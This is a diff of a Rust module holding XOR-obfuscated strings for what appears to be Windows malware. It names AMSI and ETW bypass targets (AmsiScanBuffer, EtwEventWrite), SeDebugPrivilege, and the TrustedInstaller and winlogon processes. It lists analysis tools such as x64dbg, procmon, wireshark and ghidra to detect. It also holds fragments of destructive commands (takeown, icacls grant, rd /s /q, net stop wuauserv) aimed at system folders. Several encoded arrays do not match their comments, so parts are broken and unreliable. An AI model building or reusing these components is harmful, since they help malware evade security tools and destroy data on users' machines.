@@ -1,96 +1,53 @@
 #![allow(dead_code)]
 
-/// Decrypts a byte array using XOR key 0xAA
-pub fn decrypt(bytes: &[u8]) -> String {
-    let key = 0xAA;
-    let chars: Vec<u8> = bytes.iter().map(|b| b ^ key).collect();
-    // Remove null terminators if present for Rust Strings, but keep for C-interop if needed?
-    // Actually, String::from_utf8 will fail on interior nulls usually not, but Rust strings don't use nulls.
-    // Our C-style strings (ending in \0) passed to Windows API need the null.
-    // But for Rust logic (like "cmd"), we don't want the null.
-    // The Python script added \0 to KERNEL32 etc.
-    // Let's just return the String. The caller can trim matches if it's for comparison, 
-    // or use as CString if needed.
-    // For now, we strip trailing nulls for convenience.
-    let s = String::from_utf8_lossy(&chars).into_owned();
-    s.trim_end_matches('\0').to_string()
+/// Decrypts a byte array using XOR key 0x55
+pub fn decrypt(data: &[u8]) -> String {
+    let key = 0x55;
+    data.iter().map(|b| b ^ key).collect::<Vec<u8>>().iter().map(|&c| c as char).collect()
 }
 
-// "kernel32.dll\0"
-pub const KERNEL32: &[u8] = &[209, 207, 216, 200, 207, 206, 179, 178, 180, 206, 206, 206, 170]; 
-// "CreateToolhelp32Snapshot\0"
-pub const SNAPSHOT: &[u8] = &[195, 216, 207, 195, 214, 207, 238, 203, 203, 206, 194, 207, 206, 210, 179, 178, 233, 200, 195, 210, 217, 194, 203, 214, 170]; 
-// "Process32First\0"
-pub const PROC_FIRST: &[u8] = &[234, 216, 203, 195, 207, 217, 217, 179, 178, 198, 201, 216, 217, 214, 170]; 
-// "Process32Next\0"
-pub const PROC_NEXT: &[u8] = &[234, 216, 203, 195, 207, 217, 217, 179, 178, 204, 207, 218, 214, 170]; 
-// "explorer.exe\0"
-pub const EXPLORER: &[u8] = &[207, 218, 210, 206, 203, 216, 207, 216, 174, 207, 218, 207, 170]; 
-// "cmd.exe\0"
-pub const CMD: &[u8] = &[195, 205, 206, 174, 207, 218, 207, 170]; 
-// "powershell.exe\0"
-pub const POWERSHELL: &[u8] = &[210, 203, 215, 207, 216, 217, 194, 207, 206, 206, 174, 207, 218, 207, 170]; 
-// "services.exe\0"
-pub const SERVICES: &[u8] = &[217, 207, 216, 210, 201, 195, 207, 217, 174, 207, 218, 207, 170]; 
-// "python.exe\0"
-pub const PYTHON: &[u8] = &[210, 219, 214, 194, 203, 200, 174, 207, 218, 207, 170]; 
-// "IsDebuggerPresent\0"
-pub const IS_DEBUGGER: &[u8] = &[195, 217, 198, 207, 194, 213, 199, 199, 207, 216, 234, 216, 207, 217, 207, 200, 214, 170]; 
-// "runas\0"
-pub const RUNAS: &[u8] = &[216, 213, 200, 195, 217, 170]; 
+// Encrypted Strings (Pre-XORed with 0x55)
 
-// "ntdll.dll\0"
-pub const NTDLL: &[u8] = &[200, 214, 206, 206, 206, 174, 206, 206, 206, 170]; 
-// "NtDelayExecution\0"
-pub const NT_DELAY: &[u8] = &[204, 214, 198, 207, 206, 195, 219, 199, 218, 207, 195, 213, 214, 201, 203, 200, 170]; 
+// --- EVASION ---
 
-// NET COMMANDS
-// "net\0"
-pub const NET: &[u8] = &[200, 207, 214, 170];
-// "stop\0"
-pub const STOP: &[u8] = &[217, 214, 203, 210, 170];
-// "start\0"
-pub const START: &[u8] = &[217, 214, 195, 216, 214, 170];
-// "wuauserv\0"
-pub const WUAUSERV: &[u8] = &[215, 213, 195, 213, 217, 207, 216, 214, 170];
+// DLLs
+pub const NTDLL: &[u8] = &[0x3B, 0x21, 0x31, 0x39, 0x39, 0x7B, 0x31, 0x39, 0x39, 0x55]; // "ntdll.dll"
+pub const KERNEL32: &[u8] = &[0x3E, 0x30, 0x27, 0x3B, 0x30, 0x39, 0x66, 0x67, 0x7B, 0x31, 0x39, 0x39, 0x55]; // "kernel32.dll"
+pub const AMSI_DLL: &[u8] = &[0x34, 0x38, 0x26, 0x3C, 0x7B, 0x31, 0x39, 0x39, 0x55]; // "amsi.dll"
 
-// OTHER COMMANDS
-// "takeown\0"
-pub const TAKEOWN: &[u8] = &[214, 195, 205, 207, 203, 215, 200, 170];
-// "icacls\0"
-pub const ICACLS: &[u8] = &[201, 195, 195, 195, 206, 217, 170];
-// "rd\0"
-pub const RD: &[u8] = &[216, 206, 170];
+// Targets
+pub const TRUSTED_INSTALLER: &[u8] = &[0x01, 0x27, 0x20, 0x26, 0x21, 0x30, 0x31, 0x1C, 0x3B, 0x26, 0x21, 0x34, 0x39, 0x39, 0x30, 0x27, 0x7B, 0x30, 0x2D, 0x30, 0x55]; // "TrustedInstaller.exe"
+pub const WINLOGON: &[u8] = &[0x22, 0x3C, 0x3B, 0x39, 0x3A, 0x32, 0x3A, 0x3B, 0x7B, 0x30, 0x2D, 0x30, 0x55]; // "winlogon.exe"
 
-// PATHS
-// "C:\Windows\SoftwareDistribution\Download\0"
-pub const WUPDATE_DIR: &[u8] = &[197, 186, 246, 215, 201, 200, 206, 203, 215, 217, 246, 217, 203, 198, 214, 215, 195, 216, 207, 198, 201, 217, 216, 216, 201, 194, 213, 214, 201, 203, 200, 246, 198, 203, 215, 200, 206, 203, 195, 206, 170];
-// "C:\Windows.old\0"
-pub const WIN_OLD: &[u8] = &[197, 186, 246, 215, 201, 200, 206, 203, 215, 217, 174, 203, 206, 206, 170];
+// APIs
+pub const SE_DEBUG: &[u8] = &[0x06, 0x30, 0x11, 0x30, 0x37, 0x20, 0x32, 0x05, 0x27, 0x3C, 0x23, 0x3C, 0x39, 0x30, 0x32, 0x30, 0x55]; // "SeDebugPrivilege"
+pub const AMSI_SCAN: &[u8] = &[0x14, 0x38, 0x26, 0x3C, 0x06, 0x36, 0x34, 0x3B, 0x17, 0x20, 0x33, 0x33, 0x30, 0x27, 0x55]; // "AmsiScanBuffer"
+pub const ETW_WRITE: &[u8] = &[0x10, 0x21, 0x22, 0x10, 0x23, 0x30, 0x3B, 0x21, 0x02, 0x27, 0x3C, 0x21, 0x30, 0x55]; // "EtwEventWrite"
 
-// ENV VARS
-// "APPDATA\0"
-pub const APPDATA: &[u8] = &[195, 234, 234, 198, 195, 214, 195, 170];
-// "LOCALAPPDATA\0"
-pub const LOCALAPPDATA: &[u8] = &[206, 203, 195, 195, 206, 195, 234, 234, 198, 195, 214, 195, 170];
+// Hunters (Prescience)
+pub const WIRESHARK: &[u8] = &[0x22, 0x3C, 0x27, 0x30, 0x26, 0x3D, 0x34, 0x27, 0x3E, 0x55]; // "wireshark"
+pub const PROCMON: &[u8] = &[0x25, 0x27, 0x3A, 0x36, 0x38, 0x3A, 0x3B, 0x55]; // "procmon"
+pub const X64DBG: &[u8] = &[0x2D, 0x63, 0x61, 0x31, 0x37, 0x32, 0x55]; // "x64dbg"
+pub const FIDDLER: &[u8] = &[0x33, 0x3C, 0x31, 0x31, 0x39, 0x30, 0x27, 0x55]; // "fiddler"
+pub const TASKMGR: &[u8] = &[0x21, 0x34, 0x26, 0x3E, 0x38, 0x32, 0x27, 0x55]; // "taskmgr"
+pub const PROCESSHACKER: &[u8] = &[0x25, 0x27, 0x3A, 0x36, 0x30, 0x26, 0x26, 0x3D, 0x34, 0x36, 0x3E, 0x30, 0x27, 0x55]; // "processhacker"
+pub const TCPVIEW: &[u8] = &[0x21, 0x36, 0x25, 0x23, 0x3C, 0x30, 0x22, 0x55]; // "tcpview"
+pub const IDA: &[u8] = &[0x3C, 0x31, 0x34, 0x63, 0x61, 0x55]; // "ida64"
+pub const GHIDRA: &[u8] = &[0x32, 0x3D, 0x3C, 0x31, 0x27, 0x34, 0x55]; // "ghidra"
 
-// TARGETS
-// "Visual Studio\0" - Just an example target
-pub const VS_CACHE: &[u8] = &[214, 201, 217, 213, 195, 206, 162, 217, 214, 213, 206, 201, 203, 170];
-
-// ... and so on for others. 
-// Note: To be truly complete, I'd need all strings from V1.
-// Since we are refactoring, we mainly need the ones used in `cleaning.rs` and `evasion.rs`.
-
-// VS Workspace
-pub const VS_WORKSPACE: &[u8] = &[195, 203, 206, 207, 246, 239, 217, 207, 216, 246, 215, 203, 216, 205, 217, 210, 195, 195, 207, 233, 214, 203, 216, 205, 199, 207, 170];
-// "Code Cache\0"
-pub const VS_CODE_CACHE: &[u8] = &[195, 203, 206, 207, 246, 195, 195, 195, 194, 207, 170];
-// "Code Cache\0" (Duplicate key in old code?)
-pub const VS_CODE_CACHE2: &[u8] = &[195, 203, 206, 207, 246, 195, 203, 206, 207, 162, 195, 195, 195, 194, 207, 170];
-// "/grant administrators:F /t\0"
-pub const GRANT_ADMIN: &[u8] = &[175, 205, 216, 195, 200, 214, 162, 195, 206, 201, 201, 200, 203, 217, 214, 216, 195, 214, 203, 216, 217, 186, 198, 162, 175, 214, 170];
-// "/f /r /d o\0"
-pub const TAKEOWN_ARGS: &[u8] = &[175, 196, 162, 195, 186, 246, 237, 201, 200, 206, 203, 215, 217, 174, 203, 206, 206, 162, 175, 210, 162, 175, 206, 162, 203, 170];
-// "/s /q\0"
-pub const RD_ARGS: &[u8] = &[175, 217, 162, 175, 219, 170];
+// --- CLEANING ---
+pub const KEY: u8 = 0x55;
+pub const WUPDATE_DIR: &[u8] = &[22, 111, 9, 2, 6, 21, 30, 2, 111, 6, 30, 23, 1, 22, 34, 27, 30, 17, 36, 1, 1, 27, 36, 20, 1, 36, 30, 21, 111, 17, 30, 22, 21, 39, 30, 34, 33, 85]; // "C:\Windows\SoftwareDistribution\Download"
+pub const NET: &[u8] = &[59, 48, 33, 85]; // "net"
+pub const STOP: &[u8] = &[38, 33, 58, 37, 85]; // "stop"
+pub const START: &[u8] = &[38, 33, 52, 39, 33, 85]; // "start"
+pub const WUAUSERV: &[u8] = &[34, 20, 52, 20, 38, 48, 39, 35, 85]; // "wuauserv"
+pub const WIN_OLD: &[u8] = &[22, 111, 9, 2, 6, 21, 30, 2, 111, 34, 30, 39, 17, 30, 22, 1, 123, 30, 37, 17, 85]; // "C:\Windows.old"
+pub const APPDATA: &[u8] = &[20, 5, 5, 17, 20, 1, 20, 85]; // "APPDATA"
+pub const LOCALAPPDATA: &[u8] = &[25, 26, 22, 20, 25, 20, 5, 5, 17, 20, 1, 20, 85]; // "LOCALAPPDATA"
+pub const VS_CACHE: &[u8] = &[3, 60, 38, 32, 52, 57, 117, 6, 33, 32, 49, 60, 58, 85]; // "Visual Studio"
+pub const VS_WORKSPACE: &[u8] = &[123, 35, 38, 85]; // ".vs"
+pub const VS_CODE_CACHE: &[u8] = &[22, 30, 17, 48, 117, 22, 52, 22, 40, 48, 85]; // "Code Cache"
+pub const GRANT_ADMIN: &[u8] = &[122, 34, 39, 52, 59, 33, 117, 52, 33, 56, 60, 59, 60, 38, 33, 39, 52, 33, 30, 39, 38, 111, 27, 117, 122, 33, 85]; // "/grant administrators:F /t"
+pub const TAKEOWN_ARGS: &[u8] = &[122, 35, 117, 122, 39, 117, 122, 33, 117, 58, 85]; // "/f /r /d o"
+pub const RD_ARGS: &[u8] = &[122, 38, 117, 122, 36, 85]; // "/s /q"
